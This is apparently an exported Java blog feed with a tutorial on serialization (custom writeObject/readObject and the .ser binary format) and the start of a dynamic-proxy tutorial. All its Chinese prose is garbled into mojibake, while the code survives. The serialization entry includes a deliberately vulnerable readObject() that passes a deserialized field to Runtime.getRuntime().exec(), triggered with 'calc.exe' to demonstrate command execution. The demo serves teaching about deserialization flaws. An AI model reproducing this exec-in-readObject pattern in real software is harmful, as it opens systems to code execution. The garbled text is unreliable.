ä»»ä½•ä¸œè¥¿å¯ä»¥è‡ªåŠ¨åºåˆ—åŒ–ï¼Œå¹¶ä¸”å¯åœ¨writeExternal()å†…éƒ¨åªå¯¹æ‰€éœ€éƒ¨åˆ†è¿›è¡Œæ˜¾å¼çš„åºåˆ—åŒ–ï¼›äºŒæ˜¯å½“æˆ‘ä»¬æ­£åœ¨æ“ä½œçš„æ˜¯ä¸€ä¸ªSerializableå¯¹è±¡ï¼Œåˆ™æ‰€æœ‰åºåˆ—åŒ–æ“ä½œä¼šè‡ªåŠ¨æ‰§è¡Œï¼Œè¿™æ—¶å°±å¯åº”ç”¨åˆ°transientï¼ˆçž¬æ—¶ï¼‰å…³é”®å­—æ¥é€ä¸ªå­—æ®µåœ°å…³é—­åºåˆ—åŒ–ï¼Œå³è¯´æ˜ŽæŒ‡å®šå­—æ®µå†…å®¹åœ¨åºåˆ—åŒ–ä¸­æ˜¯ä¸éœ€è¦ä¿å­˜æˆ–æ¢å¤æ“ä½œçš„ã€‚ ç”±äºŽExternalizableå¯¹è±¡åœ¨é»˜è®¤æƒ…å†µä¸‹ä¸ä¿å­˜å®ƒä»¬çš„ä»»ä½•å­—æ®µï¼Œæ‰€ä»¥transientå…³é”®å­—åªèƒ½å’ŒSerializableå¯¹è±¡ä¸€èµ·ä½¿ç”¨ã€‚ 3ã€è‡ªå·±å®žçŽ°Serializable è‹¥éžååˆ†åšå®šåœ°ä½¿ç”¨ExternalizableæŽ¥å£ï¼Œé‚£ä¹ˆè¿˜å¯ä»¥è‡ªå·±å®žçŽ°SerializableæŽ¥å£ï¼Œå¹¶æ·»åŠ writeObject()å’ŒreadObject()æ–¹æ³•ï¼Œä¸€æ—¦å¯¹è±¡è¢«åºåˆ—åŒ–å’Œååºåˆ—åŒ–è¿˜åŽŸï¼Œå°±ä¼šè‡ªåŠ¨åœ°åˆ†åˆ«è°ƒç”¨è¿™ä¸¤ä¸ªæ–¹æ³•ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œè¯´çš„æ˜¯â€œæ·»åŠ â€è€Œéžâ€œè¦†ç›–â€æˆ–â€œå®žçŽ°â€ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåªè¦æˆ‘ä»¬æä¾›äº†è¿™ä¸¤ä¸ªæ–¹æ³•ï¼Œç¨‹åºå°±ä¼šä½¿ç”¨è¿™ä¸¤ä¸ªæ–¹æ³•è€Œéžé»˜è®¤çš„åºåˆ—åŒ–æœºåˆ¶ã€‚ è¿™äº›æ–¹æ³•å¿…é¡»å…·æœ‰å‡†ç¡®çš„æ–¹æ³•ç‰¹å¾ç­¾åï¼š 123private void writeObject(ObjectOutputStream stream) throws IOExceptionprivate void readObject(ObjectInputStream stream) throws IOException, ClassNotFoundException æ³¨æ„ï¼Œè¿™äº›æ–¹æ³•è¢«å®šä¹‰æˆäº†privateã€‚ åœ¨è°ƒç”¨ObjectOutputStream.writeObject()æ—¶ï¼Œä¼šæ£€æŸ¥æ‰€ä¼ é€’çš„Serializableå¯¹è±¡ï¼Œçœ‹çœ‹æ˜¯å¦å®žçŽ°äº†è‡ªå·±çš„writeObject()ï¼Œè‹¥å®žçŽ°äº†ï¼Œåˆ™è·³è¿‡æ­£å¸¸çš„åºåˆ—åŒ–è¿‡ç¨‹å¹¶è°ƒç”¨è‡ªå·±å®žçŽ°çš„writeObject()ã€‚readObject()æ–¹æ³•çš„æƒ…å½¢ç±»ä¼¼ã€‚ åºåˆ—åŒ–çš„äºŒè¿›åˆ¶æ ¼å¼çœ‹å›žåˆšæ‰ç”¨WinHexæ‰“å¼€çš„åºåˆ—åŒ–Demoç”Ÿæˆçš„user.seræ–‡ä»¶ï¼š AC EDï¼šSTREAM_MAGICï¼Œå£°æ˜Žä½¿ç”¨äº†åºåˆ—åŒ–åè®®ï¼Œä»Žè¿™é‡Œå¯ä»¥åˆ¤æ–­ä¿å­˜çš„å†…å®¹æ˜¯å¦ä¸ºåºåˆ—åŒ–æ•°æ®ã€‚ 00 05ï¼šSTREAM_VERSIONï¼Œåºåˆ—åŒ–åè®®ç‰ˆæœ¬ã€‚ 0x73ï¼šTC_OBJECTï¼Œå£°æ˜Žè¿™æ˜¯ä¸€ä¸ªæ–°çš„å¯¹è±¡ã€‚ 0x72ï¼šTC_CLASSDESCï¼Œå£°æ˜Žè¿™é‡Œå¼€å§‹ä¸€ä¸ªæ–°Classã€‚ 00 04ï¼šClassåå­—çš„é•¿åº¦ï¼Œè¿™é‡ŒClassåä¸ºUserï¼Œé•¿åº¦ä¸º4ã€‚ 55 73 65 72ï¼šç±»åç§°Userã€‚ 64 D4 C4 D2 26 CA C4 8Dï¼šSerialVersionUIDï¼Œåºåˆ—åŒ–IDï¼Œå¦‚æžœæ²¡æœ‰æŒ‡å®šï¼Œåˆ™ä¼šç”±ç®—æ³•éšæœºç”Ÿæˆä¸€ä¸ª8byteçš„IDã€‚ 0x02ï¼šæ ‡è®°å·ï¼Œè¯¥å€¼å£°æ˜Žè¯¥å¯¹è±¡æ”¯æŒåºåˆ—åŒ–ã€‚ 00 02ï¼šè¯¥ç±»æ‰€åŒ…å«çš„åŸŸä¸ªæ•°ã€‚ 0x49ï¼šåŸŸç±»åž‹ï¼Œ49 ä»£è¡¨â€Iâ€ï¼Œä¹Ÿå°±æ˜¯Intã€‚ 00 06ï¼šåŸŸåå­—çš„é•¿åº¦ï¼Œè¯¥åŸŸåä¸ºnumberã€é•¿åº¦ä¸º6ã€‚ 6E 75 6D 62 65 72ï¼šåŸŸåå­—æè¿°ï¼Œè¿™é‡Œä¸ºnumberã€‚ 0x4Cï¼šåŸŸçš„ç±»åž‹ï¼Œ4Cä»£è¡¨Stringã€‚ 00 04ï¼šåŸŸåå­—çš„é•¿åº¦ï¼Œè¯¥åŸŸåä¸ºnameã€é•¿åº¦ä¸º4ã€‚ 6E 61 6D 65ï¼šåŸŸåå­—æè¿°ï¼Œè¿™é‡Œä¸ºnameã€‚ 0x74ï¼šTC_STRINGï¼Œä»£è¡¨ä¸€ä¸ªnew Stringï¼Œç”¨Stringæ¥å¼•ç”¨å¯¹è±¡ã€‚ 00 12ï¼šè¯¥Stringé•¿åº¦ï¼Œè¿™é‡ŒStringä¸ºâ€œLjava/lang/String;â€ã€é•¿åº¦ä¸º0x12. 4C 6A 61 76 61 2F 6C 61 6E 67 2F 53 74 72 69 6E 67 3Bï¼šJVMçš„æ ‡å‡†å¯¹è±¡ç­¾åè¡¨ç¤ºæ³•ï¼Œè¿™é‡Œæ˜¯æŒ‡Stringä¸ºâ€œLjava/lang/String;â€ã€‚ 0x78ï¼šTC_ENDBLOCKDATAï¼Œå¯¹è±¡æ•°æ®å—ç»“æŸçš„æ ‡å¿—ã€‚ 0x70ï¼šTC_NULLï¼Œè¯´æ˜Žæ²¡æœ‰å…¶ä»–è¶…ç±»çš„æ ‡å¿—ã€‚ 00 00 02 9Aï¼šè¿™ä¸ªæš‚æ—¶ä¸çŸ¥é“ï¼Œå„ä½å¤§ä½¬çŸ¥é“çš„éº»çƒ¦æŒ‡ç‚¹ä¸€ä¸‹ ï¼š) 0x74ï¼šTC_STRINGï¼Œä»£è¡¨ä¸€ä¸ªnew Stringï¼Œç”¨Stringæ¥å¼•ç”¨å¯¹è±¡ã€‚ 00 07ï¼šåŸŸåå­—çš„é•¿åº¦ï¼Œè¯¥åŸŸåä¸ºMi1k7eaã€é•¿åº¦ä¸º7ã€‚ 4D 69 31 6B 37 65 61ï¼šåŸŸåå­—æè¿°ï¼Œè¿™é‡Œä¸ºâ€œMi1k7eaâ€ã€‚ è‡ªå®šä¹‰å®žçŽ°åºåˆ—åŒ–å¦‚å‰é¢åºåˆ—åŒ–çš„æŽ§åˆ¶ä¸­çš„è‡ªå·±å®žçŽ°Serializableæ‰€è¯´ï¼Œå¯ä»¥æ·»åŠ writeObject()å’ŒreadObject()è¿™ä¸¤ä¸ªæ–¹æ³•ï¼Œå®ƒä»¬å¹¶ä¸å±žäºŽä»»ä½•çš„ç±»å’ŒæŽ¥å£ï¼Œåªè¦åœ¨è¦åºåˆ—åŒ–çš„ç±»ä¸­æä¾›è¿™ä¸¤ä¸ªæ–¹æ³•ï¼Œå°±ä¼šåœ¨åºåˆ—åŒ–æœºåˆ¶ä¸­è‡ªåŠ¨è¢«è°ƒç”¨ã€‚ è‡ªå®šä¹‰å®žçŽ°çš„å¥½å¤„æ˜¯ï¼šç¨‹åºå‘˜å¯ä»¥æ›´åŠ ç²¾ç»†æˆ–è€…è¯´å¯ä»¥åŽ»å®šåˆ¶è‡ªå·±æƒ³è¦å®žçŽ°çš„åºåˆ—åŒ–ï¼Œå¦‚ä¸‹é¢ä¾‹å­ä¸­å°†nameå’Œaddresså˜é‡å€¼åè½¬ã€‚åˆ©ç”¨è¿™ç§ç‰¹ç‚¹ï¼Œå¯ä»¥åœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­å¯¹ä¸€äº›æ•æ„Ÿä¿¡æ¯åšç‰¹æ®Šçš„å¤„ç†ã€‚ User.classï¼šæ·»åŠ äº†privateå…³é”®å­—çš„writeObject()å’ŒreadObject()ä¸¤ä¸ªæ–¹æ³• 123456789101112131415161718192021222324import java.io.IOException;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.io.Serializable;public class User implements Serializable &#123; public String name; public String address; public int number; private void writeObject(ObjectOutputStream out) throws IOException &#123; System.out.println("[*]Write Object."); out.writeObject(new StringBuffer(name).reverse()); out.writeObject(new StringBuffer(address).reverse()); out.writeInt(number); &#125; private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException &#123; System.out.println("[*]Read Object."); this.name = ((StringBuffer)in.readObject()).reverse().toString(); this.address = ((StringBuffer)in.readObject()).reverse().toString(); this.number = in.readInt(); &#125;&#125; test.classï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041import java.io.*;public class test &#123; public static void serialize_test()&#123; User user = new User(); user.name = "Mi1k7ea"; user.address = "England"; user.number = 666; try &#123; FileOutputStream fos = new FileOutputStream("user.ser"); ObjectOutputStream obs = new ObjectOutputStream(fos); obs.writeObject(user); obs.close(); fos.close(); System.out.println("[*]Userå¯¹è±¡å·²ç»åºåˆ—åŒ–ä¿å­˜åˆ°user.seræ–‡ä»¶ä¸­"); &#125; catch (IOException e)&#123; e.printStackTrace(); &#125; &#125; public static void unserialize_test()&#123; User user = null; try &#123; FileInputStream fis = new FileInputStream("user.ser"); ObjectInputStream ois = new ObjectInputStream(fis); user = (User)ois.readObject(); ois.close(); fis.close(); &#125; catch (IOException e)&#123; e.printStackTrace(); &#125; catch (ClassNotFoundException e)&#123; e.printStackTrace(); &#125; System.out.println("Name: " + user.name + "\nAddress: " + user.address + "\nNumber: " + user.number); &#125; public static void main(String[] args) &#123; serialize_test(); unserialize_test(); &#125;&#125; è¿è¡ŒæŸ¥çœ‹ï¼Œç¡®å®žæ˜¯ç»è¿‡è‡ªå·±ç¼–å†™çš„writeObject()å’ŒreadObject()ä¸¤ä¸ªæ–¹æ³•æ¥å®žçŽ°åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ“ä½œçš„ï¼š whatâ€™s moreï¼â€”â€”ååºåˆ—åŒ–æ¼æ´žç‚¹ Javaååºåˆ—åŒ–æ¼æ´žç‚¹é€šå¸¸åœ¨äºŽè‡ªå®šä¹‰å®žçŽ°çš„readObject()æ–¹æ³•çš„ä»£ç é€»è¾‘å­˜åœ¨ç¼ºé™·ï¼Œå¯¼è‡´å¯èƒ½ä¼šè§¦å‘ååºåˆ—åŒ–æ¼æ´žã€‚ å…¶å®žè¿™å’ŒPHPååºåˆ—åŒ–æ¼æ´žåŽŸç†å·®ä¸å¤šï¼ŒPHPä¸­æ˜¯é­”æ³•å‡½æ•°è‹¥å­˜åœ¨ç¼ºé™·ä»£ç åˆ™å¯èƒ½ä¼šå­˜åœ¨ååºåˆ—åŒ–æ¼æ´žé£Žé™©ï¼Œè¿™ç±»ä¼¼äºŽJavaä¸­è‡ªå®šä¹‰å®žçŽ°çš„readObject()å‡½æ•°ã€‚ ä¸‹é¢çš„ä¾‹å­åªåœ¨å‰é¢çš„ä¾‹å­ä¸­æ·»åŠ ifè¯­å¥ä¸­çš„Runtime.getRuntime().exec()ï¼š User.classï¼š 12345678910111213141516171819202122232425262728import java.io.IOException;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.io.Serializable;public class User implements Serializable &#123; public String name; public String address; public int number; private void writeObject(ObjectOutputStream out) throws IOException &#123; System.out.println("[*]Write Object."); out.writeObject(new StringBuffer(name).reverse()); out.writeObject(new StringBuffer(address).reverse()); out.writeInt(number); &#125; private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException &#123; System.out.println("[*]Read Object."); this.name = ((StringBuffer)in.readObject()).reverse().toString(); this.address = ((StringBuffer)in.readObject()).reverse().toString(); this.number = in.readInt(); //åŠ äº†ä¸ªåˆ¤æ–­ï¼Œå½“æ•°å­—ä¸º666æ—¶ï¼Œè¿›å…¥ç¼ºé™·ä»£ç é€»è¾‘å— if (this.number == 666)&#123; Runtime.getRuntime().exec(name); &#125; &#125;&#125; test.class 12345678910111213141516171819202122232425262728293031323334353637383940414243import java.io.*;public class test &#123; public static void serialize_test()&#123; User user = new User(); //å°†nameå­—æ®µå€¼ä¿®æ”¹ä¸ºcalcå‘½ä»¤ user.name = "calc.exe"; user.address = "England"; //å°†numberå€¼è®¾ç½®ä¸ºæ»¡è¶³ifåˆ¤æ–­æ¡ä»¶çš„666å€¼ user.number = 666; try &#123; FileOutputStream fos = new FileOutputStream("user.ser"); ObjectOutputStream obs = new ObjectOutputStream(fos); obs.writeObject(user); obs.close(); fos.close(); System.out.println("[*]Userå¯¹è±¡å·²ç»åºåˆ—åŒ–ä¿å­˜åˆ°user.seræ–‡ä»¶ä¸­"); &#125; catch (IOException e)&#123; e.printStackTrace(); &#125; &#125; public static void unserialize_test()&#123; User user = null; try &#123; FileInputStream fis = new FileInputStream("user.ser"); ObjectInputStream ois = new ObjectInputStream(fis); user = (User)ois.readObject(); ois.close(); fis.close(); &#125; catch (IOException e)&#123; e.printStackTrace(); &#125; catch (ClassNotFoundException e)&#123; e.printStackTrace(); &#125; System.out.println("Name: " + user.name + "\nAddress: " + user.address + "\nNumber: " + user.number); &#125; public static void main(String[] args) &#123; serialize_test(); unserialize_test(); &#125;&#125; è¿è¡Œä»£ç ï¼ŒæŸ¥çœ‹åˆ°readObject()ä¸­çš„ä¸å®‰å…¨ä»£ç å—ä¸­æ‰§è¡Œäº†å‘½ä»¤ï¼š å‚è€ƒæ·±å…¥ç†è§£JAVA I/Oç³»åˆ—äº”ï¼šå¯¹è±¡åºåˆ—åŒ– Java åºåˆ—åŒ– javaç±»ä¸­serialversionuid ä½œç”¨ æ˜¯ä»€ä¹ˆ?ä¸¾ä¸ªä¾‹å­è¯´æ˜Ž]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaåŠ¨æ€ä»£ç†æœºåˆ¶]]></title>
    <url>%2F2019%2F02%2F01%2FJava%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6%2F</url>
    <content type="text"><![CDATA[JavaåŠ¨æ€ä»£ç†æœºåˆ¶ä¸»è¦é€šè¿‡åå°„æœºåˆ¶æ¥å®žçŽ°çš„ï¼Œä¸‹é¢è®²è§£ä¸€ä¸‹åŠ¨æ€ä»£ç†ç›¸å…³å†…å®¹ã€‚ ä»£ç†æ¨¡å¼ä»£ç†æ¨¡å¼æ˜¯Javaä¸­å¸¸ç”¨çš„è®¾è®¡æ¨¡å¼ï¼Œä¸»è¦ç”±å…¬å…±æŽ¥å£ã€è¢«ä»£ç†ç±»å’Œä»£ç†ç±»ç­‰ä¸‰éƒ¨åˆ†ç»„æˆï¼Œä»£ç†ç±»æŒæœ‰è¢«ä»£ç†ç±»çš„å®žç±»ï¼Œä»£ä¸ºæ‰§è¡Œå…·ä½“çš„ç±»æ–¹æ³•ã€‚å…¶ä¸­ä»£ç†ç±»ä¸Žè¢«ä»£ç†ç±»æœ‰åŒæ ·çš„æŽ¥å£ã€‚ ä»£ç†ç±»ä¸Žè¢«ä»£ç†ç±»ä¹‹é—´é€šå¸¸ä¼šå­˜åœ¨å…³è”å…³ç³»ï¼Œä¸€ä¸ªä»£ç†ç±»çš„å¯¹è±¡ä¸Žä¸€ä¸ªè¢«ä»£ç†ç±»çš„å¯¹è±¡å…³è”ï¼Œä»£ç†ç±»çš„å¯¹è±¡æœ¬èº«å¹¶ä¸çœŸæ­£å®žçŽ°æœåŠ¡ï¼Œè€Œæ˜¯é€šè¿‡è°ƒç”¨è¢«ä»£ç†ç±»å¯¹è±¡çš„æ–¹æ³•æ¥æä¾›ç‰¹å®šçš„æœåŠ¡ã€‚ ä»£ç†æ¨¡å¼ç»“æž„å›¾ ä½¿ç”¨ä»£ç†æ¨¡å¼çš„åœºæ™¯ (1)ã€è®¾è®¡æ¨¡å¼ä¸­æœ‰ä¸€ä¸ªè®¾è®¡åŽŸåˆ™æ˜¯å¼€é—­åŽŸåˆ™ï¼ŒæŒ‡ä¿®æ”¹å…³é—­å¯¹æ‰©å±•å¼€æ”¾ï¼Œå½“éœ€è¦çœ‹éžæœ¬äººæ‰€å†™çš„ä»£ç æ—¶ï¼Œé€šå¸¸å¾ˆéš¾ç›´æŽ¥ä¿®æ”¹ä»£ç ï¼Œé‚£ä¹ˆè¿™æ—¶å°±å¯ä»¥é€šè¿‡ä»£ç†å¯¹ç±»è¿›è¡Œå¢žå¼ºã€‚ (2)ã€åœ¨ä½¿ç”¨RPCæ¡†æž¶æ—¶ï¼Œæ¡†æž¶æœ¬èº«å¹¶ä¸èƒ½æå‰çŸ¥é“å„ä¸ªä¸šåŠ¡æ–¹è¦è°ƒç”¨å“ªäº›æŽ¥å£çš„å“ªäº›æ–¹æ³• ã€‚é‚£ä¹ˆè¿™æ—¶å°±å¯é€šè¿‡åŠ¨æ€ä»£ç†çš„æ–¹å¼æ¥å»ºç«‹ä¸€ä¸ªä¸­é—´äººç»™å®¢æˆ·ç«¯ä½¿ç”¨ï¼Œä¹Ÿæ–¹ä¾¿æ¡†æž¶è¿›è¡Œæ­å»ºé€»è¾‘ï¼ŒæŸç§ç¨‹åº¦ä¸Šä¹Ÿæ˜¯å®¢æˆ·ç«¯ä»£ç å’Œæ¡†æž¶æ¾è€¦åˆçš„ä¸€ç§è¡¨çŽ°ã€‚ (3)ã€Springçš„AOPæœºåˆ¶å°±æ˜¯é‡‡ç”¨åŠ¨æ€ä»£ç†çš„æœºåˆ¶æ¥å®žçŽ°åˆ‡é¢ç¼–ç¨‹ã€‚ é™æ€ä»£ç†ä¸ŽåŠ¨æ€ä»£ç† æ ¹æ®åŠ è½½è¢«ä»£ç†ç±»çš„æ—¶æœºä¸åŒï¼Œå°†ä»£ç†åˆ†ä¸ºé™æ€ä»£ç†å’ŒåŠ¨æ€ä»£ç†ã€‚ å¦‚æžœåœ¨ä»£ç ç¼–è¯‘æ—¶å°±ç¡®å®šäº†è¢«ä»£ç†çš„ç±»æ˜¯å“ªä¸€ä¸ªï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æŽ¥ä½¿ç”¨é™æ€ä»£ç†ï¼›å¦‚æžœä¸èƒ½ç¡®å®šï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨ç±»çš„åŠ¨æ€åŠ è½½æœºåˆ¶ï¼Œåœ¨ä»£ç è¿è¡ŒæœŸé—´åŠ è½½è¢«ä»£ç†çš„ç±»ï¼Œè¿™å°±æ˜¯åŠ¨æ€ä»£ç†ï¼Œæ¯”å¦‚RPCæ¡†æž¶å’ŒSpring AOPæœºåˆ¶ã€‚ é™æ€ä»£ç†é™æ€ä»£ç†ï¼šåœ¨ä»£ç ç¼–è¯‘æ—¶å°±ç¡®å®šäº†å…·ä½“çš„è¢«ä»£ç†ç±»ã€‚ç”±ç¨‹åºå‘˜åˆ›å»ºæˆ–ç‰¹å®šå·¥å…·è‡ªåŠ¨ç”Ÿæˆæºä»£ç ï¼Œä¹Ÿå°±æ˜¯åœ¨ç¼–è¯‘æ—¶å°±å·²ç»å°†æŽ¥å£ã€è¢«ä»£ç†ç±»ã€ä»£ç†ç±»ç­‰ç¡®å®šä¸‹æ¥ã€‚åœ¨ç¨‹åºè¿è¡Œä¹‹å‰ï¼Œä»£ç†ç±»çš„.classæ–‡ä»¶å°±å·²ç»ç”Ÿæˆã€‚ Demoç¤ºä¾‹ å…¶ä¸­è¢«ä»£ç†ç±»å·²ç»æ˜Žç¡®çš„åœ¨ä»£ç†ç±»ä»£ç ä¸­å†™å‡ºï¼Œåœ¨ä»£ç ç¼–è¯‘æ—¶å°±èƒ½ç¡®å®šå‡ºè¯¥è¢«ä»£ç†ç±»ï¼Œä»Žè€Œå®žçŽ°é™æ€ä»£ç†ï¼š 123456789101112131415161718192021222324252627public class test &#123; public static void consumer(ProxyInterface pi)&#123; pi.echo(); &#125; public static void main(String[] args) throws Exception&#123; consumer(new ProxyObject()); &#125;&#125;interface ProxyInterface &#123; void echo();&#125;class RealObject implements ProxyInterface &#123; public void echo()&#123; System.out.println("This is RealObject."); &#125;&#125;class ProxyObject implements ProxyInterface&#123; public void echo()&#123; System.out.println("AOP"); new RealObject().echo(); System.out.println("Write Log"); &#125;&#125; å¯ä»¥çœ‹åˆ°ï¼Œä»£ç†ç±»ProxyObjectåœ¨æ‰§è¡Œè¢«ä»£ç†ç±»RealObjectçš„æ–¹æ³•å‰åŽéƒ½èƒ½å¤Ÿæ–¹ä¾¿åœ°æ·»åŠ æ–°çš„åŠŸèƒ½å¦‚Springçš„é¢å‘åˆ‡é¢ç¼–ç¨‹AOPï¼Œä¸”æ˜¯é€šè¿‡è°ƒç”¨è¢«ä»£ç†ç±»çš„æ–¹æ³•æ¥å®žçŽ°è°ƒç”¨çš„è€Œéžä»£ç†ç±»è‡ªå·±ç›´æŽ¥è°ƒç”¨çš„ï¼š åŠ¨æ€ä»£ç†åŸºæœ¬æ¦‚å¿µåœ¨ä»£ç ç¼–è¯‘æ—¶æœªç¡®å®šå…·ä½“çš„è¢«ä»£ç†ç±»ï¼Œè€Œåœ¨ä»£ç è¿è¡Œæ—¶åŠ¨æ€åŠ è½½è¢«ä»£ç†çš„ç±»ã€‚åœ¨Javaä¸­java.lang.reflectåŒ…ä¸‹æä¾›äº†ä¸€ä¸ªProxyç±»å’Œä¸€ä¸ªInvocationHandleræŽ¥å£ï¼Œé€šè¿‡ä½¿ç”¨è¿™ä¸ªç±»å’ŒæŽ¥å£å°±å¯ä»¥ç”ŸæˆåŠ¨æ€ä»£ç†å¯¹è±¡ã€‚åœ¨ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­äº§ç”Ÿçš„è¿™ä¸ªå¯¹è±¡ï¼Œå…¶å®žå°±æ˜¯é€šè¿‡åå°„æœºåˆ¶æ¥ç”Ÿæˆçš„ä¸€ä¸ªä»£ç†ã€‚ æ³¨æ„ï¼ŒJDKæä¾›çš„ä»£ç†åªèƒ½é’ˆå¯¹æŽ¥å£åšä»£ç†ã€‚ ä¸‹é¢æ¥çœ‹ä¸‹å®žçŽ°åŠ¨æ€ä»£ç†æœºåˆ¶çš„Proxyç±»å’ŒInvocationHandleræŽ¥å£ã€‚ InvocationHandleræŽ¥å£æ¯ä¸€ä¸ªåŠ¨æ€ä»£ç†ç±»éƒ½å¿…é¡»è¦å®žçŽ°InvocationHandlerè¿™ä¸ªæŽ¥å£ï¼Œå¹¶ä¸”æ¯ä¸ªä»£ç†ç±»çš„å®žä¾‹éƒ½å…³è”åˆ°äº†ä¸€ä¸ªhandlerï¼Œå½“ä»£ç†ç±»å¯¹è±¡è°ƒç”¨ä¸€ä¸ªæ–¹æ³•çš„æ—¶å€™ï¼Œè¿™ä¸ªæ–¹æ³•çš„è°ƒç”¨å°±ä¼šè¢«è½¬å‘ä¸ºç”±InvocationHandlerè¿™ä¸ªæŽ¥å£çš„ invoke ()æ–¹æ³•æ¥è¿›è¡Œè°ƒç”¨ã€‚ ä½œä¸ºInvocationHandleræŽ¥å£å”¯ä¸€çš„æ–¹æ³•ï¼Œinvoke ()æ–¹æ³•å®šä¹‰å¦‚ä¸‹ï¼š 1Object invoke(Object proxy, Method method, Object[] args) throws Throwable proxyå‚æ•°ï¼šæŒ‡ä»£è¢«ä»£ç†ç±»å¯¹è±¡å³çœŸå®žå¯¹è±¡ï¼› methodå‚æ•°ï¼šæŒ‡ä»£çš„æ˜¯æ‰€è¦è°ƒç”¨è¢«ä»£ç†ç±»å¯¹è±¡çš„æŸä¸ªæ–¹æ³•çš„Methodå¯¹è±¡ï¼› argså‚æ•°ï¼šæŒ‡ä»£çš„æ˜¯è°ƒç”¨è¢«ä»£ç†ç±»å¯¹è±¡æŸä¸ªæ–¹æ³•æ—¶æŽ¥å—çš„å‚æ•°ï¼› Proxyç±»Proxyè¿™ä¸ªç±»çš„ä½œç”¨å°±æ˜¯ç”¨æ¥åŠ¨æ€åˆ›å»ºä¸€ä¸ªä»£ç†å¯¹è±¡ç±»ï¼Œå®ƒæä¾›äº†è®¸å¤šçš„æ–¹æ³•ï¼Œå…¶ä¸­ç”¨çš„æœ€å¤šçš„å°±æ˜¯ newProxyInstance ()æ–¹æ³•ï¼š 1public static Object newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h) throws IllegalArgumentException è¿™ä¸ªæ–¹æ³•çš„ä½œç”¨å°±æ˜¯å¾—åˆ°ä¸€ä¸ªåŠ¨æ€çš„ä»£ç†ç±»å¯¹è±¡ï¼Œå…¶ä¸­æŽ¥æ”¶ä¸‰ä¸ªå‚æ•°ï¼š loaderå‚æ•°ï¼šä¸€ä¸ªClassLoaderå¯¹è±¡ï¼Œå®šä¹‰äº†ç”±å“ªä¸ªClassLoaderå¯¹è±¡æ¥å¯¹ç”Ÿæˆçš„ä»£ç†ç±»å¯¹è±¡è¿›è¡ŒåŠ è½½ï¼› interfaceså‚æ•°ï¼šä¸€ä¸ªInterfaceæŽ¥å£å¯¹è±¡æ•°ç»„ï¼Œè¯´æ˜Žå°†è¦ç»™è¢«ä»£ç†ç±»å¯¹è±¡æä¾›ä¸€ç»„ä»€ä¹ˆæ ·çš„æŽ¥å£ï¼Œå¦‚æžœæä¾›äº†ä¸€ç»„æŽ¥å£ç»™è¢«ä»£ç†ç±»å¯¹è±¡ï¼Œé‚£ä¹ˆè¯¥å¯¹è±¡å°±å®£ç§°å®žçŽ°äº†è¯¥æŽ¥å£(å¤šæ€)ï¼Œè¿™æ ·å°±èƒ½è°ƒç”¨è¿™ç»„æŽ¥å£ä¸­çš„æ–¹æ³•äº†ï¼› hå‚æ•°ï¼šä¸€ä¸ªInvocationHandlerå¯¹è±¡ï¼Œè¡¨ç¤ºçš„æ˜¯å½“è¿™ä¸ªåŠ¨æ€ä»£ç†å¯¹è±¡åœ¨è°ƒç”¨æ–¹æ³•çš„æ—¶å€™ï¼Œä¼šå…³è”åˆ°å“ªä¸€ä¸ªInvocationHandlerå¯¹è±¡ä¸Šï¼› åˆ›å»ºåŠ¨æ€ä»£ç†å¯¹è±¡çš„å…·ä½“æ­¥éª¤1ã€åˆ›å»ºä¸€ä¸ªInvocationHandlerå¯¹è±¡ 12//åˆ›å»ºä¸€ä¸ªä¸Žä»£ç†å¯¹è±¡ç›¸å…³è”çš„InvocationHandlerInvocationHandler stuHandler = new MyInvocationHandler&lt;Person&gt;(stu); 2ã€ä½¿ç”¨Proxyç±»çš„getProxyClassé™æ€æ–¹æ³•ç”Ÿæˆä¸€ä¸ªåŠ¨æ€ä»£ç†ç±»stuProxyClass 1Class&lt;?&gt; stuProxyClass = Proxy.getProxyClass(Person.class.getClassLoader(), new Class&lt;?&gt;[] &#123;Person.class&#125;); 3ã€èŽ·å¾—stuProxyClass ä¸­ä¸€ä¸ªå¸¦InvocationHandlerå‚æ•°çš„æž„é€ å™¨constructor 1Constructor&lt;?&gt; constructor = PersonProxy.getConstructor(InvocationHandler.class); 4ã€é€šè¿‡æž„é€ å™¨constructoræ¥åˆ›å»ºä¸€ä¸ªåŠ¨æ€å®žä¾‹stuProxy 1Person stuProxy = (Person) cons.newInstance(stuHandler); å½“ç„¶ï¼Œä¸Šé¢å››ä¸ªæ­¥éª¤å¯ä»¥é€šè¿‡Proxyç±»çš„newProxyInstances()æ–¹æ³•æ¥ç®€åŒ–ï¼š 1234//åˆ›å»ºä¸€ä¸ªä¸Žä»£ç†å¯¹è±¡ç›¸å…³è”çš„InvocationHandlerInvocationHandler stuHandler = new MyInvocationHandler&lt;Person&gt;(stu);//åˆ›å»ºä¸€ä¸ªä»£ç†å¯¹è±¡stuProxyï¼Œä»£ç†å¯¹è±¡çš„æ¯ä¸ªæ‰§è¡Œæ–¹æ³•éƒ½ä¼šæ›¿æ¢æ‰§è¡ŒInvocationä¸­çš„invokeæ–¹æ³•Person stuProxy= (Person) Proxy.newProxyInstance(Person.class.getClassLoader(), new Class&lt;?&gt;[]&#123;Person.class&#125;, stuHandler); Demoç¤ºä¾‹1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;public class test &#123; public static void main(String[] args) &#123; //åˆ›å»ºä¸€ä¸ªè¢«ä»£ç†ç±»çš„å¯¹è±¡ Subject realSubject = new RealSubject(); //é€šè¿‡å®žçŽ°InvacationHandleræŽ¥å£ï¼Œå°†è¢«ä»£ç†ç±»å¯¹è±¡ä¼ å…¥handler InvocationHandler handler = new 